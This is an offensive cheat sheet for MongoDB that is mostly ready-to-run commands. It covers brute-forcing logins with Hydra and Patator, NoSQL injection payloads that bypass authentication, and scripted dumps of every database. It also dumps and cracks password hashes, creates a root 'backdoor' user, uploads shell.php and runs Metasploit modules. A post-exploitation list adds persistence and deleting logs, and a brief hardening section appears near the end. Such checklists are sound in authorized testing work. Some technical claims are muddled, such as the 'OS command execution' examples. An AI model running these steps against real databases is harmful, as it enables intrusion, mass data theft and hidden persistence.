# MONGODB ENUMERATION (Port 27017)

## PORT OVERVIEW
```
Port 27017 - MongoDB (default)
Port 27018 - MongoDB shardsvr
Port 27019 - MongoDB configsvr
Port 28017 - MongoDB web interface (deprecated)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p27017 <IP>                           # Service/Version detection
nmap -p27017 --script mongodb-info <IP>         # MongoDB server info
nc -nv <IP> 27017                               # Manual connection
telnet <IP> 27017                               # Manual connection
```

## NMAP MONGODB ENUMERATION
```bash
nmap --script "mongodb-*" -p27017 <IP>          # All MongoDB scripts
nmap --script mongodb-info -p27017 <IP>         # Server information
nmap --script mongodb-databases -p27017 <IP>    # List databases
nmap --script mongodb-brute -p27017 <IP>        # Brute force
```

## MONGO SHELL (PRIMARY TOOL)
```bash
# Connect to MongoDB
mongo <IP>                                      # Default port 27017
mongo <IP>:27017                                # Specify port
mongo mongodb://<IP>:27017                      # URI format
mongo mongodb://<USER>:<PASSWORD>@<IP>:27017    # With credentials
mongo mongodb://<USER>:<PASSWORD>@<IP>:27017/<DATABASE>  # Specific database

# After connection
> show dbs                                      # List databases
> use <database>                                # Switch database
> show collections                              # List collections
> db.collection.find()                          # Query collection
> exit                                          # Quit
```

## AUTHENTICATION TESTING
```bash
# Test for no authentication
mongo <IP>                                      # Try direct connection
> show dbs                                      # If no auth required, this works

# Test with credentials
mongo mongodb://<USER>:<PASSWORD>@<IP>:27017
mongo <IP>
> use admin                                     # Switch to admin database
> db.auth("admin", "password")                  # Authenticate

# Common default credentials
admin:admin
root:root
admin:password
mongodb:mongodb
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l admin -P passwords.txt mongodb://<IP>  # Single user
hydra -L users.txt -P passwords.txt mongodb://<IP>  # User/pass lists

# Nmap
nmap --script mongodb-brute -p27017 <IP>
nmap --script mongodb-brute --script-args userdb=users.txt,passdb=pass.txt -p27017 <IP>

# Patator
patator mongodb_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

## ENUMERATE DATABASES
```bash
# After authentication (or if no auth required)

# List all databases
show dbs
db.adminCommand('listDatabases')

# Switch to database
use <database>

# Get database statistics
db.stats()

# List collections
show collections
db.getCollectionNames()

# Get collection statistics
db.collection.stats()
```

## ENUMERATE COLLECTIONS & DATA
```bash
# List all collections in database
show collections
db.getCollectionNames()

# Count documents
db.collection.count()
db.collection.countDocuments()

# Query collection (find all documents)
db.collection.find()                            # All documents
db.collection.find().pretty()                   # Pretty print
db.collection.find().limit(10)                  # First 10 documents

# Query specific fields
db.collection.find({}, {username: 1, password: 1})  # Only username and password
db.collection.find({username: "admin"})         # Find admin user

# Search for sensitive data
db.collection.find({$or: [{field: /password/i}, {field: /token/i}]})
```

## ENUMERATE USERS
```bash
# Switch to admin database
use admin

# List all users
db.system.users.find()
db.system.users.find().pretty()

# Get user details
db.getUsers()
db.getUser("admin")

# Check current user
db.runCommand({connectionStatus: 1})
```

## EXTRACT ALL DATA
```bash
# Dump all databases
# Use mongodump tool
mongodump --host <IP> --port 27017 --out /tmp/dump/  # No auth
mongodump --host <IP> --port 27017 -u <USER> -p <PASSWORD> --authenticationDatabase admin --out /tmp/dump/

# Dump specific database
mongodump --host <IP> --port 27017 --db <database> --out /tmp/dump/

# Export to JSON
mongoexport --host <IP> --port 27017 --db <database> --collection <collection> --out collection.json
mongoexport --host <IP> --port 27017 --db <database> --collection <collection> --jsonArray --out collection.json

# Export all collections in a database
for collection in $(mongo <IP>/<database> --quiet --eval "db.getCollectionNames().join('\n')"); do
  mongoexport --host <IP> --db <database> --collection $collection --out ${collection}.json
done
```

## COMMAND EXECUTION (SERVER-SIDE JAVASCRIPT)
```bash
# MongoDB allows server-side JavaScript execution
# Requires permissions

# Execute JavaScript
db.eval("return 1+1")                           # Simple calculation
db.eval("return db.getCollectionNames()")       # List collections

# OS command execution (if $where operator enabled)
# MongoDB < 4.2 (deprecated in 4.2+)
db.collection.find({$where: "function() { return this.username == 'admin' }"})

# Command execution via mapReduce (older versions)
db.collection.mapReduce(
  function() { emit(this.username, 1); },
  function(k, v) { return Array.sum(v); },
  { out: "result" }
)

# NoSQL injection for command execution
# If web app passes user input to MongoDB
db.collection.find({username: req.body.username})  # Vulnerable
# Inject: {"username": {"$ne": null}}             # Bypass authentication
```

## NOSQL INJECTION
```bash
# NoSQL injection in web applications

# Authentication bypass
# Normal query: db.users.find({username: "admin", password: "password"})
# Inject: username[$ne]=admin&password[$ne]=password
# Results in: db.users.find({username: {$ne: "admin"}, password: {$ne: "password"}})

# Common NoSQL injection payloads
{"$ne": null}                                   # Not equal to null (always true)
{"$gt": ""}                                     # Greater than empty string
{"$regex": ".*"}                                # Match everything

# Examples
username[$ne]=admin&password[$ne]=password      # Bypass authentication
username=admin&password[$regex]=.*              # Extract password via regex
username[$regex]=^a.*&password[$ne]=x           # Brute force username

# MongoDB operator injection
$where: "this.username == 'admin'"              # Server-side JavaScript
$where: "sleep(5000)"                           # Time-based injection
```

## PRIVILEGE ESCALATION
```bash
# Check current user privileges
use admin
db.runCommand({connectionStatus: 1})

# Create new admin user (requires admin privileges)
use admin
db.createUser({
  user: "backdoor",
  pwd: "Password123!",
  roles: [{role: "root", db: "admin"}]
})

# Grant role to existing user
db.grantRolesToUser("user", [{role: "root", db: "admin"}])

# List all roles
db.getRoles({showBuiltinRoles: true})
```

## PASSWORD HASH DUMPING
```bash
# Dump user hashes
use admin
db.system.users.find()
db.system.users.find({}, {user: 1, credentials: 1})

# MongoDB hashes are SCRAM-SHA-1 or SCRAM-SHA-256
# Format: SCRAM-SHA-1$<iterations>$<salt>$<storedKey>$<serverKey>

# Crack MongoDB hashes
hashcat -m 24100 hashes.txt rockyou.txt         # SCRAM-SHA-1
# Note: MongoDB hashing is difficult to crack offline
```

## FILE OPERATIONS (GRIDFS)
```bash
# MongoDB GridFS stores files in database
# Used for large files (> 16MB)

# List GridFS files
use <database>
db.fs.files.find()                              # List files metadata
db.fs.chunks.find()                             # List file chunks

# Download file from GridFS
mongofiles --host <IP> --db <database> get <filename>
mongofiles --host <IP> --db <database> list     # List all files

# Upload file to GridFS (if write access)
mongofiles --host <IP> --db <database> put shell.php
```

## ENUMERATE REPLICA SET
```bash
# MongoDB replica sets provide high availability
# Enumerate replica set members

# Get replica set status
rs.status()
rs.conf()

# If target is part of replica set
# Can connect to other members for lateral movement

# List replica set members
rs.status().members
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/mongodb/mongodb_login     # Login scanner
use auxiliary/gather/mongodb_js_inject_collection_enum  # Enumerate via JS injection
use auxiliary/admin/mongodb/mongodb_auth_bypass # Auth bypass (CVE-2013-1892)
use auxiliary/admin/mongodb/mongodb_shell       # MongoDB shell access

# Example: Login scanner
set RHOSTS <IP>
set USERNAME admin
set PASS_FILE passwords.txt
run
```

## MONGODB WEB INTERFACE (PORT 28017)
```bash
# Older MongoDB versions expose web interface on port 28017
# Web interface provides server stats and debugging info

# Access via browser
http://<IP>:28017/                              # Web interface
http://<IP>:28017/serverStatus                  # Server status
http://<IP>:28017/replSetGetStatus             # Replica set status
http://<IP>:28017/listDatabases                 # List databases

# Check with curl
curl http://<IP>:28017/
curl http://<IP>:28017/listDatabases

# Note: Web interface deprecated in MongoDB 3.2+
```

## MONGODB SHELL SCRIPTS
```bash
# Execute JavaScript from file
mongo <IP> script.js                            # Execute script

# Example script: Enumerate all databases and collections
cat > enum.js <<'EOF'
var dbs = db.adminCommand('listDatabases').databases;
dbs.forEach(function(database) {
  db = db.getSiblingDB(database.name);
  print("Database: " + database.name);
  db.getCollectionNames().forEach(function(collection) {
    print("  Collection: " + collection);
    print("  Count: " + db[collection].count());
  });
});
EOF

mongo <IP> enum.js
```

## MONGODB ENUMERATION SCRIPT
```bash
# Automated MongoDB enumeration
cat > mongo_enum.sh <<'EOF'
#!/bin/bash
IP=$1
echo "[*] MongoDB Enumeration: $IP"
echo "[*] Testing for no authentication..."
mongo $IP --quiet --eval "printjson(db.adminCommand('listDatabases'))" 2>/dev/null && echo "[+] No authentication required!"
echo "[*] Enumerating databases and collections..."
mongo $IP --quiet enum.js 2>/dev/null
EOF
chmod +x mongo_enum.sh
./mongo_enum.sh <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication enabled
☐ MongoDB exposed to internet (bind 0.0.0.0)
☐ Weak/default credentials
☐ Authorization not enabled
☐ JavaScript execution enabled ($where, mapReduce)
☐ MongoDB running as root
☐ Web interface exposed (port 28017)
☐ Old MongoDB version (known CVEs)
☐ No firewall rules
☐ Sensitive data stored in plaintext
```

## QUICK WIN CHECKLIST
```
☐ Test for no authentication
☐ Test default/weak credentials
☐ Enumerate databases and collections
☐ Search for sensitive data (users, passwords, tokens)
☐ Dump all data (mongodump)
☐ Check for NoSQL injection in web apps
☐ Check if JavaScript execution is enabled
☐ Dump user hashes
☐ Check for replica set (lateral movement)
☐ Check for web interface (port 28017)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick MongoDB enumeration
nmap -sV -p27017,28017 --script mongodb-info,mongodb-databases <IP>

# With mongo shell
mongo <IP> --quiet --eval "printjson(db.adminCommand('listDatabases'))"
mongo <IP> --quiet --eval "db.getCollectionNames()"

# Dump all data
mongodump --host <IP> --out /tmp/dump/
```

## ADVANCED TECHNIQUES
```bash
# MongoDB SSRF exploitation
# If web app connects to MongoDB based on user input
# Can exploit to access internal MongoDB instances

# MongoDB time-based blind NoSQL injection
# Extract data character by character via timing

# MongoDB aggregation pipeline exploitation
# Use aggregation for complex queries and data exfiltration

# MongoDB change streams
# Monitor real-time changes to collections (requires appropriate permissions)
db.collection.watch()
```

## MONGODB CVE EXPLOITS
```bash
# CVE-2013-1892 - Authentication bypass
# CVE-2013-2132 - Buffer overflow
# CVE-2015-7882 - Privilege escalation
# CVE-2016-6494 - Arbitrary code execution

# Search for exploits
searchsploit mongodb
```

## RANSOMWARE TARGETING MONGODB
```bash
# MongoDB instances have been targeted by ransomware
# Attackers delete data and demand ransom

# Check for ransom notes in databases
show dbs                                        # Look for suspicious database names
# Common ransom DB names: PLEASE_READ, WARNING, README

# Restore from backup if available
# Otherwise, data may be lost
```

## POST-EXPLOITATION (AFTER MONGODB ACCESS)
```bash
# After gaining MongoDB access:
1. Enumerate all databases and collections
2. Search for sensitive data (credentials, PII, tokens, API keys)
3. Dump all data (mongodump, mongoexport)
4. Check for user accounts and password hashes
5. Test for privilege escalation (create admin user)
6. Check for replica set members (lateral movement)
7. Search for file uploads (GridFS)
8. Create persistence (backdoor user)
9. Check for connected applications (examine connection strings)
10. Cover tracks (delete logs if possible)

# Full data extraction
# List all databases
mongo <IP> --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d) { print(d.name) })" > databases.txt

# For each database, dump all collections
while read db; do
  echo "Dumping database: $db"
  mongodump --host <IP> --db $db --out /tmp/dump/
done < databases.txt

# Export to JSON for analysis
while read db; do
  for collection in $(mongo <IP>/$db --quiet --eval "db.getCollectionNames().join('\n')"); do
    mongoexport --host <IP> --db $db --collection $collection --out ${db}_${collection}.json
  done
done < databases.txt
```

## MONGODB SECURITY HARDENING (FOR BLUE TEAM)
```bash
# Secure MongoDB configuration

# Enable authentication
use admin
db.createUser({
  user: "admin",
  pwd: "<strong_password>",
  roles: [{role: "root", db: "admin"}]
})

# Edit /etc/mongod.conf
security:
  authorization: enabled

# Bind to localhost only
net:
  bindIp: 127.0.0.1

# Disable JavaScript execution
security:
  javascriptEnabled: false

# Firewall rules
# Allow only trusted IPs

# Update to latest version
# Older versions have known vulnerabilities

# Enable TLS/SSL
net:
  ssl:
    mode: requireSSL
    PEMKeyFile: /path/to/cert.pem

# Regular backups
mongodump --out /backup/$(date +%Y%m%d)/
```

## MONGODB ATLAS (CLOUD)
```bash
# MongoDB Atlas is cloud-hosted MongoDB
# Check for exposed Atlas clusters

# Connection string format
mongodb+srv://<USER>:<PASSWORD>@cluster.mongodb.net/<DATABASE>

# If connection string is leaked
# Can connect to cloud instance
mongo "mongodb+srv://<USER>:<PASSWORD>@cluster.mongodb.net/<DATABASE>"
```
